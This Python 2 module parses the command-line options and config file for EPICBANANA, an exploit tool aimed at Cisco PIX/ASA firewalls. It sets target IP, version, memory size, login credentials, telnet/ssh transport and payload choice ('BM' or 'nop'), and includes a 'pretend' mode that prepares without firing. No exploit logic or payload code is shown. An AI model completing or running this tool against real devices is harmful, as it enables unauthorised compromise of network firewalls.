import sys
import optparse
import ConfigParser
import re

##
##
##
##
##
##
##
##
##
##
##
##
##
##
##
##
##
##
##
##
##
##
##
##
##
##
##

class Params:
    def __init__(self):
        ##
        self.config = ConfigParser.ConfigParser()
        self.config.read("EPBA.config")

        ##
        ##

        self.VERSION = "2.1.0.1"

        ##
        self.parser = optparse.OptionParser(version="%prog " + self.VERSION,
                                            description="EPICBANANA")

        if self.config.has_section("EPICBANANA"):
            self.parser.set_defaults(target_ip   = self.config.get("EPICBANANA", "target_ip"),
                                     proto       = self.config.get("EPICBANANA", "proto"),
                                     target_port = self.config.get("EPICBANANA", "target_port"),
                                     username    = self.config.get("EPICBANANA", "username"),
                                     password    = self.config.get("EPICBANANA", "password"),
                                     delay       = self.config.get("EPICBANANA", "delay"),
                                     timeout     = self.config.get("EPICBANANA", "timeout"),
                                     target_vers = self.config.get("EPICBANANA", "target_vers"),
                                     memory      = self.config.get("EPICBANANA", "memory"),
                                     payload     = self.config.get("EPICBANANA", "payload"),
                                     ssh_cmd     = self.config.get("EPICBANANA", "ssh_cmd"),
                                     ssh_opts    = self.config.get("EPICBANANA", "ssh_opts"),
                                     pretend     = self.config.getboolean("EPICBANANA", "pretend"),
                                     versdir     = self.config.get("EPICBANANA", "versdir"),
                                     verbose     = self.config.getboolean("EPICBANANA", "verbose"),
                                     debug       = self.config.getboolean("EPICBANANA", "debug"))
        else:
            ##
            self.parser.set_defaults(target_ip   = "",
                                     proto       = "",
                                     target_port = 0,
                                     username    = "pix",
                                     password    = "",
                                     delay       = 1.0,
                                     timeout     = 20.0,
                                     target_vers = "",
                                     memory      = "",
                                     payload     = "BM",
                                     ssh_cmd     = "/usr/bin/ssh",
                                     ssh_opts    = "",
                                     pretend     = False,
                                     versdir     = "./versions",
                                     verbose     = True,
                                     debug       = False)

        self.parser.add_option("--target_ip", "-t",
                               action="store", type="string", dest="target_ip",
                               help="target IP (REQUIRED)")
        self.parser.add_option("--proto",
                               action="store", type="string", dest="proto",
                               help="target protocol \"telnet\" or \"ssh\" (REQUIRED)")
        self.parser.add_option("--ssh_cmd",
                               action="store", type="string", dest="ssh_cmd",
                               help="path to ssh (default /usr/bin/ssh)")
        self.parser.add_option("--ssh_opts",
                               action="store", type="string", dest="ssh_opts",
                               help="extra flags to pass to ssh, quoted (ex: \"-v\" or \"-v -1 -c des\")")
        self.parser.add_option("--username",
                               action="store", type="string", dest="username",
                               help="default = pix (optional)")
        self.parser.add_option("--password",
                               action="store", type="string", dest="password",
                               help="(REQUIRED)")
        self.parser.add_option("--delay",
                               action="store", type="float", dest="delay",
                               help="pause time between sending commands, default 1.0 seconds")
        self.parser.add_option("--timeout",
                               action="store", type="float", dest="timeout",
                               help="time to wait for responses, default 20.0 seconds")
        self.parser.add_option("--target_vers",
                               action="store", type="string", dest="target_vers",
                               help="target Pix version (pix712, asa804) (REQUIRED)")
        self.parser.add_option("--versdir",
                               action="store", type="string", dest="versdir",
                               help="where are the EPBA version-specific files? (./versions subdir default)")
        self.parser.add_option("--mem",
                               action="store", type="string", dest="memory",
                               help="target Pix memory size (64M, 1024M) (REQUIRED for pix/asa7, ASA for asa 8+)")
        self.parser.add_option("--payload",
                               action="store", type="string", dest="payload",
                               help="BM or nop (BM default)")
        self.parser.add_option("--dest_port", "-p",
                               action="store", type="int", dest="dest_port",
                               help="defaults: telnet=23, ssh=22 (optional)")
        self.parser.add_option("--pretend",
                               action="store_true", dest="pretend",
                               help="system check, prep everything but don't fire exploit")
        self.parser.add_option("-v",
                               action="store_true", dest="verbose",
                               help="verbose mode (default, recommended)")
        self.parser.add_option("--debug",
                               action="store_true", dest="debug",
                               help="debug mode (too much)")
        self.parser.add_option("-q",
                               action="store_false", dest="verbose",
                               help="quiet mode (suppress verbose)")

    def bail(self, msg):
        print "\n" + msg + "\n\n"
        self.parser.print_help()
        sys.exit(1)

    def parse(self):
        ##
        (options, args) = self.parser.parse_args(sys.argv)

        ##
        if not options.target_ip:
            self.bail("--target_ip or -t <target IP> is required!")
        ip_pattern = "^\s*(\d+\.\d+\.\d+\.\d+)\s*$"
        ip_parser = re.compile(ip_pattern)
        matches = ip_parser.search(options.target_ip)
        if matches:
            self.target_ip = matches.group(1)
        else:
            self.bail("\"" + options.target_ip + "\" doesn't look like an IP address!")

        if not options.target_vers:
            self.bail("need a target version (ex: --target_vers=pix722)!")
        ##
        self.target_vers = options.target_vers

        if not options.memory:
            self.bail("need a target memory size!")
        mem_pattern = "^(64M|128M|256M|512M|1024M|2048M|4096M|ASA)$"
        mem_parser = re.compile(mem_pattern)
        matches = mem_parser.search(options.memory)
        if matches:
            self.target_memory = options.memory
        else:
            self.bail("invalid memory size " + options.memory)

        ##
        if self.target_vers.find("asa7") == 0:
            if self.target_memory == "ASA":
                self.bail("early ASA versons (7.x(x)) require a memory size")
        if self.target_vers.find("asa8") == 0:
            if self.target_memory != "ASA":
                self.bail("later ASA versons (8.x(x)) don't require a memory size, use ASA")
        if self.target_vers.find("pix") == 0:
            if self.target_memory == "ASA":
                self.bail("Pix (all versions) require a memory size")

        if not options.payload:
            self.bail("need a payload string!")
        if options.payload == "BM":
            self.payload = "BM"
        elif options.payload == "nop":
            self.payload = "nop"
        else:
            self.bail("invalid payload string " + options.payload)

        if options.proto == "telnet":
            self.proto = "telnet"
            self.target_port = 23
        elif options.proto == "ssh":
            self.proto = "ssh"
            self.target_port = 22
        else:
            self.bail("require --proto as \"telnet\" or \"ssh\"")

        if self.proto == "ssh":
            self.ssh_cmd = options.ssh_cmd
            self.ssh_opts = options.ssh_opts

        self.username = options.username
        if not options.password:
            self.bail("require a password for target")
        self.password = options.password

        self.delay = options.delay
        if self.delay <= 0.0:
            self.bail("invalid --delay value, must be positive")
        self.timeout = options.timeout
        if self.timeout < 5.0:
            self.bail("invalid --timeout value, must be at least 5 sec")

        if options.dest_port:
            self.target_port = options.dest_port

        self.pretend = options.pretend
        if options.versdir:
            self.versdir = options.versdir
        
        self.verbose = options.verbose
        self.debug = options.debug
        if self.debug:
            self.verbose = True  ##


    def display(self):
        print "==========================="
        print "EPICBANANA (v%s) beginning..." % self.VERSION
        print "target: " + str(self.target_ip)
        print "target_vers: " + self.target_vers
        print "memory size: " + self.target_memory
        print "payload: " + self.payload
        print "protocol: " + self.proto + " (port " + str(self.target_port) + ")"
        print "send delay: " + str(self.delay)
        print "response timeout: " + str(self.timeout)
        if self.proto == "ssh":
            print "using ssh command: " + self.ssh_cmd
            print "ssh opts: " + self.ssh_opts
        print "credentials: username = " + self.username + " / password = " + self.password
        if self.verbose:
            print "verbose mode ON"
        if self.debug:
            print "debug mode ON"
        if self.versdir != "./versions":
            print "using alternate versions directory " + self.versdir
        print "==========================="
